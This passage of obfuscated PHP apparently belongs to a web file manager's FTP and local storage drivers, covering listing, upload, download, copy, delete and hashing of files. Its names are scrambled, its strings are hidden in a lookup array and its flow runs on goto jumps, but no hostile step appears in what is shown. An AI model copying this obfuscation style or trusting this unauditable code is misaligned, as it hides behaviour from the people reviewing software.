$aÅİ®¶ïä = $this->iconvSystem($aÅİ®¶ïä); goto CÊÜÁšš¿; bê‚»è—À´: foreach ($B÷Å®·šÒ÷[$Fæñ ó­ ï[74]] as $aùãŠâ‚Ëø) { $AìÍƒÎˆõ¯[] = array($Fæñ ó­ ï[75] => $Fæñ ó­ ï[8] . trim(str_replace($aÅİ®¶ïä, $Fæñ ó­ ï[33], $aùãŠâ‚Ëø), $Fæñ ó­ ï[8]) . $Fæñ ó­ ï[8], $Fæñ ó­ ï[76] => 1, $Fæñ ó­ ï[77] => 0); } foreach ($B÷Å®·šÒ÷[$Fæñ ó­ ï[73]] as $d›İƒ¬‡•) { $AìÍƒÎˆõ¯[] = array($Fæñ ó­ ï[75] => $Fæñ ó­ ï[8] . trim(str_replace($aÅİ®¶ïä, $Fæñ ó­ ï[33], $d›İƒ¬‡•), $Fæñ ó­ ï[8]), $Fæñ ó­ ï[76] => 0, $Fæñ ó­ ï[77] => $this->size($d›İƒ¬‡•)); } return $AìÍƒÎˆõ¯; goto eçÆ¯£ÁÙ¿; CÊÜÁšš¿: $B÷Å®·šÒ÷ = array($Fæñ ó­ ï[73] => array(), $Fæñ ó­ ï[74] => array()); $this->recursionFtpFiles($aÅİ®¶ïä, $B÷Å®·šÒ÷); $AìÍƒÎˆõ¯ = array(); goto bê‚»è—À´; eçÆ¯£ÁÙ¿: } public function getContent($D¸Ú×‡œÒ) { if (!$this->_isconn()) { return !1; } $D¸Ú×‡œÒ = $this->iconvSystem($D¸Ú×‡œÒ); return $this->fileSubstr($D¸Ú×‡œÒ); } public function setContent($bäíµÇ§¨‘, $a‰›ÆÙë› = '') { goto e§ìô±æÃÉ; e§ìô±æÃÉ: if (!$this->_isconn()) { return !1; } $aì»Å–ŒÃ = $this->pathThis($this->iconvSystem($bäíµÇ§¨‘)); $a³¥ïÁÀÎà = $this->tempFile($aì»Å–ŒÃ); goto E«²Ü±ÀğÀ; E«²Ü±ÀğÀ: file_put_contents($a³¥ïÁÀÎà, $a‰›ÆÙë›); $FÆğ‰²ÊàÖ = $this->upload($bäíµÇ§¨‘, $this->iconvApp($a³¥ïÁÀÎà)); $this->tempFileRemve($a³¥ïÁÀÎà); goto DÅäÇ…Øàª; DÅäÇ…Øàª: return $FÆğ‰²ÊàÖ; goto a«±¯Ì×ñ²; a«±¯Ì×ñ²: } public function fileSubstr($B²ÓÕ¯ª’, $e“„¨æ´£ = 0, $dõçÀ‘Ïˆê = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($B²ÓÕ¯ª’, $e“„¨æ´£, $dõçÀ‘Ïˆê); } private function ftpRequest($aŒ‰š¬ãÃ÷, $aôÉ¢Ü³è = 0, $d¡±Ó²Ø = false) { goto B¬îŠîÒ£÷; fÃÈ¦¤µŠ: curl_setopt($B¼Ñ‘ÆÔŠ, CURLOPT_URL, $cä¿®æŒÁŒ . $this->pathEncode($aŒ‰š¬ãÃ÷)); curl_setopt($B¼Ñ‘ÆÔŠ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($d¡±Ó²Ø) { $CŠ —Ø³É = $aôÉ¢Ü³è + $d¡±Ó²Ø - 1; curl_setopt($B¼Ñ‘ÆÔŠ, CURLOPT_RANGE, "{$aôÉ¢Ü³è}\55{$CŠ —Ø³É}"); } goto E‰ÕÚë¼è¤; e˜¥êÖ›ù: return $EŒ—İµÀì»; goto EÊĞ®Ä£Â; B¬îŠîÒ£÷: $aŒ‰š¬ãÃ÷ = $this->iconvSystem($aŒ‰š¬ãÃ÷); $cä¿®æŒÁŒ = $this->scheme . $this->host . $_SERVER[»„][4] . $this->port; $B¼Ñ‘ÆÔŠ = curl_init(); goto fÃÈ¦¤µŠ; E‰ÕÚë¼è¤: curl_setopt($B¼Ñ‘ÆÔŠ, CURLOPT_RETURNTRANSFER, 1); $EŒ—İµÀì» = curl_exec($B¼Ñ‘ÆÔŠ); curl_close($B¼Ñ‘ÆÔŠ); goto e˜¥êÖ›ù; EÊĞ®Ä£Â: } public function upload($FæöÀŒ¢²Ñ, $B·Á± Íõ£, $eƒŠ³ˆùğç = false, $AÄ¤†õ“ºä = REPEAT_REPLACE) { goto f×İ±‡—ä£; dãí„Úïœ : $B·Á± Íõ£ = $this->iconvSystem($B·Á± Íõ£); $cñàÂ‰ìã = ftp_nb_put($this->connect, $FæöÀŒ¢²Ñ, $B·Á± Íõ£, FTP_BINARY); while ($cñàÂ‰ìã == FTP_MOREDATA) { $cñàÂ‰ìã = ftp_nb_continue($this->connect); } goto BŠæƒ—²¨‹; BŠæƒ—²¨‹: if ($cñàÂ‰ìã != FTP_FINISHED) { return !1; } return $this->getPathOuter($FæöÀŒ¢²Ñ); goto D¢ «½—³; f×İ±‡—ä£: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($FæöÀŒ¢²Ñ))) { return !1; } $FæöÀŒ¢²Ñ = $this->iconvSystem($FæöÀŒ¢²Ñ); goto dãí„Úïœ ; D¢ «½—³: } public function download($A™™–ğ•‡Œ, $A·àµ´’†á = '') { goto fáŸˆæ¡œš; dÊì©©åÉ•: while ($fíÌ£µ‚åİ == FTP_MOREDATA) { $fíÌ£µ‚åİ = ftp_nb_continue($this->connect); } if ($fíÌ£µ‚åİ != FTP_FINISHED) { return !1; } return $this->iconvApp($A·àµ´’†á); goto E¶á„˜ëø®; fáŸˆæ¡œš: if (!$this->_isconn()) { return !1; } $d‰Üù›©…É = $this->pathFather($A·àµ´’†á); if (!IO::mkdir($d‰Üù›©…É)) { return !1; } goto A²«°›±­¼; A²«°›±­¼: $A™™–ğ•‡Œ = $this->iconvSystem($A™™–ğ•‡Œ); $A·àµ´’†á = $this->iconvSystem($A·àµ´’†á); $fíÌ£µ‚åİ = ftp_nb_get($this->connect, $A·àµ´’†á, $A™™–ğ•‡Œ, FTP_BINARY); goto dÊì©©åÉ•; E¶á„˜ëø®: } private function ftpList($BÇå¸â÷ç) { goto fåº­ù‚å–; E—ˆÙÜÑÇ : $FîŒÃ÷¾¬¢ = array(); foreach ($B¹ÃëÒëáš as $cÜĞŠá‘•Ø) { if ($cÜĞŠá‘•Ø == $eÓÆå‰©‡ª[91] || $cÜĞŠá‘•Ø == $eÓÆå‰©‡ª[1145]) { continue; } if (!strstr($cÜĞŠá‘•Ø, $eÓÆå‰©‡ª[8])) { $cÜĞŠá‘•Ø = $BÇå¸â÷ç . ltrim($cÜĞŠá‘•Ø, $eÓÆå‰©‡ª[8]); } $FîŒÃ÷¾¬¢[] = $this->iconvApp($cÜĞŠá‘•Ø); } return $FîŒÃ÷¾¬¢; goto FõÖºÎ³ÛÀ; fåº­ù‚å–: $eÓÆå‰©‡ª =& $_SERVER[»„]; if (!$this->isFolder($BÇå¸â÷ç)) { return !1; } @ftp_chdir($this->connect, $eÓÆå‰©‡ª[8]); goto aĞËä—‹©’; aĞËä—‹©’: $BÇå¸â÷ç = rtrim($BÇå¸â÷ç, $eÓÆå‰©‡ª[8]) . $eÓÆå‰©‡ª[8]; $B¹ÃëÒëáš = @ftp_nlist($this->connect, $BÇå¸â÷ç); if ($B¹ÃëÒëáš === !1) { $B¹ÃëÒëáš = @ftp_rawlist($this->connect, $BÇå¸â÷ç); foreach ($B¹ÃëÒëáš as $FÜš±ÛèÊ => $e”ÊìÉµóò) { $B¹ÃëÒëáš[$FÜš±ÛèÊ] = end(explode($eÓÆå‰©‡ª[1144], $e”ÊìÉµóò)); } } goto E—ˆÙÜÑÇ ; FõÖºÎ³ÛÀ: } private function recursionFtpFiles($Dãæ‘îÌ‡õ, &$eïÏ’–ò‡·) { $E”°ïœã =& $_SERVER[»„]; if (!$this->_isconn()) { return !1; } if (!($d­òó·•„é = $this->ftpList($Dãæ‘îÌ‡õ))) { return !1; } foreach ($d­òó·•„é as $Dãæ‘îÌ‡õ) { if ($this->isFolder($Dãæ‘îÌ‡õ)) { $this->recursionFtpFiles($Dãæ‘îÌ‡õ, $eïÏ’–ò‡·); $eïÏ’–ò‡·[$E”°ïœã[74]][] = $Dãæ‘îÌ‡õ; } else { $eïÏ’–ò‡·[$E”°ïœã[73]][] = $Dãæ‘îÌ‡õ; } } } private function objectMeta($f‡ÎŸ“•) { goto Cõİß¦Èç; b•Ìô†‹ó: $aÉé˜ÄÙ…— = @ftp_size($this->connect, $this->iconvSystem($f‡ÎŸ“•)); if ($aÉé˜ÄÙ…— != -1) { $e‚ŒÀÁëæì = array($BÔ½…‹ÓòÍ[77] => $aÉé˜ÄÙ…—, $BÔ½…‹ÓòÍ[29] => $BÔ½…‹ÓòÍ[163]); } else { $B†ÅéÓ¾†Í = @ftp_chdir($this->connect, $this->iconvSystem($f‡ÎŸ“•)); $e‚ŒÀÁëæì = $B†ÅéÓ¾†Í ? array($BÔ½…‹ÓòÍ[77] => 0, $BÔ½…‹ÓòÍ[29] => $BÔ½…‹ÓòÍ[76]) : !1; } Cache::set($DéÂ¥Èˆœ, $e‚ŒÀÁëæì, 0); goto bŸÖÃáÊ³; Cõİß¦Èç: $BÔ½…‹ÓòÍ =& $_SERVER[»„]; $DéÂ¥Èˆœ = $BÔ½…‹ÓòÍ[1146] . md5($f‡ÎŸ“•); $e‚ŒÀÁëæì = Cache::get($DéÂ¥Èˆœ); goto aš—àˆŠ¢¬; bŸÖÃáÊ³: return $e‚ŒÀÁëæì; goto F§Íöî¡õ; aš—àˆŠ¢¬: if ($e‚ŒÀÁëæì !== null && $e‚ŒÀÁëæì !== !1) { return $e‚ŒÀÁëæì; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $BÔ½…‹ÓòÍ[8]); goto b•Ìô†‹ó; F§Íöî¡õ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($a†·­í«×ª) { if (substr($a†·­í«×ª, 0, 2) == $_SERVER[»„][1135]) { $a†·­í«×ª = BASIC_PATH . substr($a†·­í«×ª, 2); } return $a†·­í«×ª; } public function iconvApp($e‰Ïø¯±ë‘) { $a–»ìÁ´ì‚ =& $_SERVER[»„]; global $config; return $this->iconvTo($e‰Ïø¯±ë‘, $config[$a–»ìÁ´ì‚[1133]], $config[$a–»ìÁ´ì‚[1132]]); } public function iconvSystem($a­…¤Ö¨Î) { $e™ßÑóÏ‡Ğ =& $_SERVER[»„]; global $config; return $this->iconvTo($a­…¤Ö¨Î, $config[$e™ßÑóÏ‡Ğ[1132]], $config[$e™ßÑóÏ‡Ğ[1133]]); } public function getPathOuter($Cåµ¬ƒ‰Œ) { goto cÃÃ¿ºê©î; cÃÃ¿ºê©î: $E…İ¶Ô³óĞ =& $_SERVER[»„]; $AÔÆõ“Ü¸à = $this->iconvApp($this->pathBase); $Cåµ¬ƒ‰Œ = $this->iconvApp($Cåµ¬ƒ‰Œ); goto DŸ‘È‰½é; d›ÅŸ•Ğ‰Ä: $Cåµ¬ƒ‰Œ = KodIO::clear($Cåµ¬ƒ‰Œ); $Cåµ¬ƒ‰Œ = substr($Cåµ¬ƒ‰Œ, strlen($AÔÆõ“Ü¸à)); if (empty($this->pathDriver)) { return $Cåµ¬ƒ‰Œ; } goto aóÊ‚ô«è¤; DŸ‘È‰½é: if (substr($AÔÆõ“Ü¸à, 0, 2) == $E…İ¶Ô³óĞ[1135]) { $AÔÆõ“Ü¸à = BASIC_PATH . substr($AÔÆõ“Ü¸à, 2); } if (substr($Cåµ¬ƒ‰Œ, 0, 2) == $E…İ¶Ô³óĞ[1135]) { $Cåµ¬ƒ‰Œ = BASIC_PATH . substr($Cåµ¬ƒ‰Œ, 2); } $AÔÆõ“Ü¸à = KodIO::clear($AÔÆõ“Ü¸à); goto d›ÅŸ•Ğ‰Ä; aóÊ‚ô«è¤: return $this->pathDriver . $E…İ¶Ô³óĞ[8] . ltrim($Cåµ¬ƒ‰Œ, $E…İ¶Ô³óĞ[8]); goto F†–Ş¤è×; F†–Ş¤è×: } public function mkfile($EÁ‚Ë¶ã‹­, $Bì™»Ø¾¨Ç = '', $EèÃ¸…¢ªÙ = REPEAT_RENAME) { $EÁ‚Ë¶ã‹­ = $this->iconvSystem($EÁ‚Ë¶ã‹­); @touch($EÁ‚Ë¶ã‹­); if ($Bì™»Ø¾¨Ç) { file_put_contents($EÁ‚Ë¶ã‹­, $Bì™»Ø¾¨Ç); } return is_file($EÁ‚Ë¶ã‹­) ? $this->getPathOuter($EÁ‚Ë¶ã‹­) : !1; } public function mkdir($A‚ËÖ„±ï, $fäÏ·ì½¹³ = REPEAT_SKIP) { $A‚ËÖ„±ï = $this->iconvSystem($A‚ËÖ„±ï); if (is_dir($A‚ËÖ„±ï)) { return $this->getPathOuter($A‚ËÖ„±ï); } @mkdir($A‚ËÖ„±ï, 511, !0); return is_dir($A‚ËÖ„±ï) ? $this->getPathOuter($A‚ËÖ„±ï) : !1; } public function copyFile($DÂğî‰“¨, $e£Ñá‚ŞŞÍ) { $this->mkdir($this->pathFather($e£Ñá‚ŞŞÍ)); $DÂğî‰“¨ = $this->iconvSystem($DÂğî‰“¨); $e£Ñá‚ŞŞÍ = $this->iconvSystem($e£Ñá‚ŞŞÍ); $CÛ‡ĞÊèçÏ = @copy($DÂğî‰“¨, $e£Ñá‚ŞŞÍ); return $CÛ‡ĞÊèçÏ ? $this->getPathOuter($e£Ñá‚ŞŞÍ) : !1; } public function moveFile($b÷‡àà¦¥‰, $A«±ÚÅ½Ò) { $this->mkdir($this->pathFather($A«±ÚÅ½Ò)); $b÷‡àà¦¥‰ = $this->iconvSystem($b÷‡àà¦¥‰); $A«±ÚÅ½Ò = $this->iconvSystem($A«±ÚÅ½Ò); $EğÊÓÓ¹¼å = intval(@rename($b÷‡àà¦¥‰, $A«±ÚÅ½Ò)); if (!$EğÊÓÓ¹¼å) { if ($EğÊÓÓ¹¼å = intval(@copy($b÷‡àà¦¥‰, $A«±ÚÅ½Ò))) { @unlink($b÷‡àà¦¥‰); } } return $EğÊÓÓ¹¼å ? $this->getPathOuter($A«±ÚÅ½Ò) : !1; } public function delFile($AÖÎÚ¸§Ï) { $AÖÎÚ¸§Ï = $this->iconvSystem($AÖÎÚ¸§Ï); if (!@unlink($AÖÎÚ¸§Ï)) { @chmod($AÖÎÚ¸§Ï, 511); if (!@unlink($AÖÎÚ¸§Ï)) { return !1; } } else { return !0; } } public function delFolder($dæ¸¨ÀÏ) { goto e†„§¡Öó´; F«ƒøàˆ¾¸: return rmdir($dæ¸¨ÀÏ); goto f„ß­÷Û; e†„§¡Öó´: $C˜àğ¥×‚Ò =& $_SERVER[»„]; $dæ¸¨ÀÏ = $this->iconvSystem($dæ¸¨ÀÏ); if (!is_dir($dæ¸¨ÀÏ)) { return !0; } goto b£Äï¤äßÔ; b£Äï¤äßÔ: if (!($dÈóõ ´µ = opendir($dæ¸¨ÀÏ))) { return !1; } while (($díÒ¤Ê˜Ô‘ = readdir($dÈóõ ´µ)) !== !1) { if ($díÒ¤Ê˜Ô‘ == $C˜àğ¥×‚Ò[91] || $díÒ¤Ê˜Ô‘ == $C˜àğ¥×‚Ò[1145]) { continue; } $DÁÅÖÜªµ¸ = $dæ¸¨ÀÏ . $C˜àğ¥×‚Ò[8] . $díÒ¤Ê˜Ô‘; if (!is_dir($DÁÅÖÜªµ¸)) { if (!unlink($DÁÅÖÜªµ¸)) { chmod($DÁÅÖÜªµ¸, 511); if (!unlink($DÁÅÖÜªµ¸)) { return !1; } } } else { chmod($DÁÅÖÜªµ¸, 511); $DÁÅÖÜªµ¸ = $this->iconvApp($DÁÅÖÜªµ¸); if (!$this->delFolder($DÁÅÖÜªµ¸)) { return !1; } } } closedir($dÈóõ ´µ); goto F«ƒøàˆ¾¸; f„ß­÷Û: } public function rename($Dê·‡¹æù, $cê‚¡¬‡šÔ) { goto a™˜ª¿µÅš; a™˜ª¿µÅš: $bøŒ‚ØÔƒÛ =& $_SERVER[»„]; $E¨‡ä²Ê¦ä = $this->fileNameAuto($this->pathFather($Dê·‡¹æù), $cê‚¡¬‡šÔ); $E¨‡ä²Ê¦ä = $this->iconvSystem($E¨‡ä²Ê¦ä); goto bŒÄõ©‚ÃÅ; F˜˜Ğ‹Öùñ: $F¹Ş‡ŠÅ¥ = @rename($Dê·‡¹æù, $Aº› ‚„); $Aº› ‚„ = $this->iconvApp($Aº› ‚„); return $F¹Ş‡ŠÅ¥ ? $this->getPathOuter($Aº› ‚„) : !1; goto cßØ©ÉÙ‡›; bŒÄõ©‚ÃÅ: $Dê·‡¹æù = $this->iconvSystem($Dê·‡¹æù); $A©Õ„Àõõ = $this->pathFather($Dê·‡¹æù); $Aº› ‚„ = rtrim($A©Õ„Àõõ, $bøŒ‚ØÔƒÛ[8]) . $bøŒ‚ØÔƒÛ[8] . $E¨‡ä²Ê¦ä; goto F˜˜Ğ‹Öùñ; cßØ©ÉÙ‡›: } public function size($EİÊ°ç«ÕØ) { $EİÊ°ç«ÕØ = $this->iconvSystem($EİÊ°ç«ÕØ); return (double) abs(sprintf($_SERVER[»„][1147], @filesize($EİÊ°ç«ÕØ))); } public function info($E“‘ÇÜŸè) { $E“‘ÇÜŸè = $this->iconvSystem($E“‘ÇÜŸè); if ($this->isFolder($E“‘ÇÜŸè)) { return $this->folderInfo($E“‘ÇÜŸè); } else { if ($this->isFile($E“‘ÇÜŸè)) { return $this->fileInfo($E“‘ÇÜŸè); } } return !1; } protected function infoChildren($b´‚‘óÒ†, &$f÷¯ï¶Šœ», $dÚ­®‡Å = true) { $AÎİôíŒ¦ì =& $_SERVER[»„]; $b´‚‘óÒ† = rtrim($b´‚‘óÒ†, $AÎİôíŒ¦ì[8]) . $AÎİôíŒ¦ì[8]; if ($dÚ­®‡Å) { check_abort(); $b´‚‘óÒ† = $this->iconvSystem($b´‚‘óÒ†); } if (!($e »­†ÀÌä = @opendir($b´‚‘óÒ†))) { return; } while (($fÂ¼¼Ìõç = readdir($e »­†ÀÌä)) !== !1) { if ($fÂ¼¼Ìõç == $AÎİôíŒ¦ì[91] || $fÂ¼¼Ìõç == $AÎİôíŒ¦ì[1145]) { continue; } $F²‚®Éö = $b´‚‘óÒ† . $fÂ¼¼Ìõç; if (is_file($F²‚®Éö)) { $f÷¯ï¶Šœ»[$AÎİôíŒ¦ì[78]]++; $f÷¯ï¶Šœ»[$AÎİôíŒ¦ì[77]] += (double) abs(sprintf($AÎİôíŒ¦ì[1147], @filesize($F²‚®Éö))); } else { $f÷¯ï¶Šœ»[$AÎİôíŒ¦ì[79]]++; $this->infoChildren($F²‚®Éö, $f÷¯ï¶Šœ», !1); } } closedir($e »­†ÀÌä); } private function folderInfo($Cà¼íçâïã, $c‡Ö·²Ä–ğ = false) { $cÍ÷Û¥²Ô® =& $_SERVER[»„]; $Cà¼íçâïã = rtrim($Cà¼íçâïã, $cÍ÷Û¥²Ô®[8]) . $cÍ÷Û¥²Ô®[8]; $cÏêÅ…Ó‰ = $this->iconvApp($this->pathThis($Cà¼íçâïã)); if ($c‡Ö·²Ä–ğ) { return array($cÍ÷Û¥²Ô®[28] => $cÏêÅ…Ó‰, $cÍ÷Û¥²Ô®[75] => $this->getPathOuter($Cà¼íçâïã), $cÍ÷Û¥²Ô®[29] => $cÍ÷Û¥²Ô®[76]); } $cöº°¨œô° = array($cÍ÷Û¥²Ô®[28] => $cÏêÅ…Ó‰, $cÍ÷Û¥²Ô®[75] => $this->getPathOuter($Cà¼íçâïã), $cÍ÷Û¥²Ô®[29] => $cÍ÷Û¥²Ô®[76], $cÍ÷Û¥²Ô®[183] => @filectime($Cà¼íçâïã), $cÍ÷Û¥²Ô®[106] => @filemtime($Cà¼íçâïã), $cÍ÷Û¥²Ô®[1148] => @fileatime($Cà¼íçâïã), $cÍ÷Û¥²Ô®[1142] => is_readable($Cà¼íçâïã), $cÍ÷Û¥²Ô®[1143] => is_writable($Cà¼íçâïã), $cÍ÷Û¥²Ô®[1149] => get_mode($Cà¼íçâïã)); return $cöº°¨œô°; } private function fileInfo($cÎ›³ï¸ô¶, $A¢¯¸èõ ß = false) { $dÄÚòÍõ’Å =& $_SERVER[»„]; $bĞ’¡¥Œ­Ñ = $this->iconvApp($this->pathThis($cÎ›³ï¸ô¶)); if ($A¢¯¸èõ ß) { return array($dÄÚòÍõ’Å[28] => $bĞ’¡¥Œ­Ñ, $dÄÚòÍõ’Å[75] => $this->getPathOuter($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[29] => $dÄÚòÍõ’Å[163], $dÄÚòÍõ’Å[77] => $this->size($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[156] => $this->ext($bĞ’¡¥Œ­Ñ)); } $BçÄ¸ÊÆÎ¾ = array($dÄÚòÍõ’Å[28] => $bĞ’¡¥Œ­Ñ, $dÄÚòÍõ’Å[75] => $this->getPathOuter($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[29] => $dÄÚòÍõ’Å[163], $dÄÚòÍõ’Å[183] => @filectime($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[106] => @filemtime($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[1148] => @fileatime($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[77] => $this->size($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[156] => $this->ext($bĞ’¡¥Œ­Ñ), $dÄÚòÍõ’Å[1142] => is_readable($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[1143] => is_writable($cÎ›³ï¸ô¶), $dÄÚòÍõ’Å[1149] => get_mode($cÎ›³ï¸ô¶)); return $BçÄ¸ÊÆÎ¾; } public function exist($B©³ÜÓŠß÷) { $B©³ÜÓŠß÷ = $this->iconvSystem($B©³ÜÓŠß÷); return @file_exists($B©³ÜÓŠß÷); } public function isFile($b’Ùí²´°‹) { $b’Ùí²´°‹ = $this->iconvSystem($b’Ùí²´°‹); return @is_file($b’Ùí²´°‹); } public function isFolder($Fø—åÓ©”) { $Fø—åÓ©” = $this->iconvSystem($Fø—åÓ©”); return @is_dir($Fø—åÓ©”); } public function listPath($c‡Å‹ÑŒ‹©, $FöõâµÇçÎ = false) { goto d‰ã†”Ï; C‡¸Â’ÏÛ: $a°Éï¤¿¿ = array($Eõˆöëè’[74] => array(), $Eõˆöëè’[73] => array()); if (!($E“Ñå¥ÔÓ = @opendir($c‡Å‹ÑŒ‹©))) { return $a°Éï¤¿¿; } while (($BÒÜ¼ë‘ì = readdir($E“Ñå¥ÔÓ)) !== !1) { if ($BÒÜ¼ë‘ì == $Eõˆöëè’[91] || $BÒÜ¼ë‘ì == $Eõˆöëè’[1145]) { continue; } $AğãÕæ¼¸Ê = $c‡Å‹ÑŒ‹© . $BÒÜ¼ë‘ì; if (is_file($AğãÕæ¼¸Ê)) { $a°Éï¤¿¿[$Eõˆöëè’[73]][] = $this->fileInfo($AğãÕæ¼¸Ê, $FöõâµÇçÎ); } else { $a°Éï¤¿¿[$Eõˆöëè’[74]][] = $this->folderInfo($AğãÕæ¼¸Ê, $FöõâµÇçÎ); } } goto b‰„´­ä×Ø; b‰„´­ä×Ø: closedir($E“Ñå¥ÔÓ); return $a°Éï¤¿¿; goto B¤÷£ùÒÃ‰; d‰ã†”Ï: $Eõˆöëè’ =& $_SERVER[»„]; $c‡Å‹ÑŒ‹© = $this->iconvSystem($c‡Å‹ÑŒ‹©); $c‡Å‹ÑŒ‹© = rtrim($c‡Å‹ÑŒ‹©, $Eõˆöëè’[8]) . $Eõˆöëè’[8]; goto C‡¸Â’ÏÛ; B¤÷£ùÒÃ‰: } public function listAll($f¢®†—Š‰…, &$d¤„„ïÄ”Ğ = array()) { goto aÚÓö Œ‚¸; Aà²ëâ‡ï: if (!($A¶›ª©¢°Ñ = @opendir($f¢®†—Š‰…))) { return $d¤„„ïÄ”Ğ; } while (($Bˆœ›Â£³ = readdir($A¶›ª©¢°Ñ)) !== !1) { if ($Bˆœ›Â£³ == $eˆ¨·šø¢Ÿ[91] || $Bˆœ›Â£³ == $eˆ¨·šø¢Ÿ[1145]) { continue; } $DÄğôÁ‰”” = $f¢®†—Š‰… . $Bˆœ›Â£³; if (is_dir($DÄğôÁ‰””)) { $d¤„„ïÄ”Ğ[] = array($eˆ¨·šø¢Ÿ[75] => $DÄğôÁ‰”” . $eˆ¨·šø¢Ÿ[8], $eˆ¨·šø¢Ÿ[76] => 1, $eˆ¨·šø¢Ÿ[106] => @filemtime($DÄğôÁ‰””), $eˆ¨·šø¢Ÿ[77] => 0); $this->listAll($DÄğôÁ‰””, $d¤„„ïÄ”Ğ); } else { $d¤„„ïÄ”Ğ[] = array($eˆ¨·šø¢Ÿ[75] => $DÄğôÁ‰””, $eˆ¨·šø¢Ÿ[76] => 0, $eˆ¨·šø¢Ÿ[106] => @filemtime($DÄğôÁ‰””), $eˆ¨·šø¢Ÿ[77] => $this->size($DÄğôÁ‰””)); } } closedir($A¶›ª©¢°Ñ); goto D‡ÂœÖÒÈ; D‡ÂœÖÒÈ: return $d¤„„ïÄ”Ğ; goto EÎ®î¿ª; aÚÓö Œ‚¸: $eˆ¨·šø¢Ÿ =& $_SERVER[»„]; $f¢®†—Š‰… = $this->iconvSystem($f¢®†—Š‰…); $f¢®†—Š‰… = rtrim($f¢®†—Š‰…, $eˆ¨·šø¢Ÿ[8]) . $eˆ¨·šø¢Ÿ[8]; goto Aà²ëâ‡ï; EÎ®î¿ª: } public function has($CÍŞéÚé©Œ, $fëÈÑÆùˆ¿ = false, $B®™Â¾ŠêÇ = true) { goto FâÚĞ™£¤È; DÅƒ«çÅ˜: while (($DÉê‘­ÓÃô = readdir($BëĞ‡ÍÏÄ¾)) !== !1) { if ($DÉê‘­ÓÃô == $FÏ”“«ˆš½[91] || $DÉê‘­ÓÃô == $FÏ”“«ˆš½[1145]) { continue; } $AİÛíÈ˜ì¿ = $CÍŞéÚé©Œ . $DÉê‘­ÓÃô; if ($fëÈÑÆùˆ¿) { if (@is_file($AİÛíÈ˜ì¿)) { $e¡˜êâĞ†++; } else { $bäİùØÉö++; } continue; } if ($B®™Â¾ŠêÇ) { if (@is_file($AİÛíÈ˜ì¿)) { return !0; } } else { if (@is_dir($AİÛíÈ˜ì¿ . $FÏ”“«ˆš½[8])) { return !0; } } } closedir($BëĞ‡ÍÏÄ¾); if ($fëÈÑÆùˆ¿) { return array($FÏ”“«ˆš½[187] => $e¡˜êâĞ†, $FÏ”“«ˆš½[188] => $bäİùØÉö); } goto D¿¨¡òäŒ¥; F•Œ‚Ç­ÖÑ: if (!($BëĞ‡ÍÏÄ¾ = @opendir($CÍŞéÚé©Œ))) { return !1; } $e¡˜êâĞ† = 0; $bäİùØÉö = 0; goto DÅƒ«çÅ˜; FâÚĞ™£¤È: $FÏ”“«ˆš½ =& $_SERVER[»„]; $CÍŞéÚé©Œ = $this->iconvSystem($CÍŞéÚé©Œ); $CÍŞéÚé©Œ = rtrim($CÍŞéÚé©Œ, $FÏ”“«ˆš½[8]) . $FÏ”“«ˆš½[8]; goto F•Œ‚Ç­ÖÑ; D¿¨¡òäŒ¥: return !1; goto bÂƒª÷êŠÈ; bÂƒª÷êŠÈ: } public function hashSimple($b‘æ§ÚëŒĞ) { goto e‡˜âò†ë«; B÷…¦ÃÔ¥˜: $b«Ã°ŞÙ­” = $this->size($b‘æ§ÚëŒĞ); $FÅÜêµÑ = 200; $E Æ¿éÈ = 50; goto F£İ»Ç°; F£İ»Ç°: if ($b«Ã°ŞÙ­” <= $FÅÜêµÑ * $E Æ¿éÈ) { return $this->hashMd5($b‘æ§ÚëŒĞ) . $b«Ã°ŞÙ­”; } $eªÄ÷‰§©Â = $E©á­ñÜ±¨[33]; $f²Ã¡®­‰ = intval($b«Ã°ŞÙ­” / $E Æ¿éÈ); goto eÄ‡Ï´¹œ; BÕµß­¥´: fseek($Fˆ‚øÍ½‹, $b«Ã°ŞÙ­” - $FÅÜêµÑ); $eªÄ÷‰§©Â .= fread($Fˆ‚øÍ½‹, $FÅÜêµÑ); fclose($Fˆ‚øÍ½‹); goto D£ÊåŠÊ˜; e‡˜âò†ë«: $E©á­ñÜ±¨ =& $_SERVER[»„]; if (!$b‘æ§ÚëŒĞ) { return md5($E©á­ñÜ±¨[33]); } $b‘æ§ÚëŒĞ = $this->iconvSystem($b‘æ§ÚëŒĞ); goto B÷…¦ÃÔ¥˜; D£ÊåŠÊ˜: return md5($eªÄ÷‰§©Â) . $b«Ã°ŞÙ­”; goto fĞœÄ®†Ú¡; eÄ‡Ï´¹œ: $Fˆ‚øÍ½‹ = fopen($b‘æ§ÚëŒĞ, $E©á­ñÜ±¨[1150]); if (!$Fˆ‚øÍ½‹) { return $eªÄ÷‰§©Â; } for ($E†Ï ßê§³ = 0; $E†Ï ßê§³ < $E Æ¿éÈ; $E†Ï ßê§³++) { fseek($Fˆ‚øÍ½‹, $f²Ã¡®­‰ * $E†Ï ßê§³); $eªÄ÷‰§©Â .= fread($Fˆ‚øÍ½‹, $FÅÜêµÑ); } goto BÕµß­¥´; fĞœÄ®†Ú¡: } public function getContent($D ‘óí®£) { $D ‘óí®£ = $this->iconvSystem($D ‘óí®£); return file_get_contents($D ‘óí®£); } public function setContent($CÁºñİ½¢õ, $bÄŞÔ“…ê = '') { $CÁºñİ½¢õ = $this->iconvSystem($CÁºñİ½¢õ); @file_put_contents($CÁºñİ½¢õ, $bÄŞÔ“…ê, LOCK_EX); clearstatcache(); return strlen($bÄŞÔ“…ê) == filesize($CÁºñİ½¢õ); } public function fileSubstr($AèˆƒØêß, $E½¨‘óÀÜª = 0, $CÚ¼–Å¨Üó = false) { goto F“‡¶Í†µ; F“‡¶Í†µ: $cƒ¡Ë§ï¬ñ =& $_SERVER[»„]; $AèˆƒØêß = $this->iconvSystem($AèˆƒØêß); if ($CÚ¼–Å¨Üó === !1) { $CÚ¼–Å¨Üó = 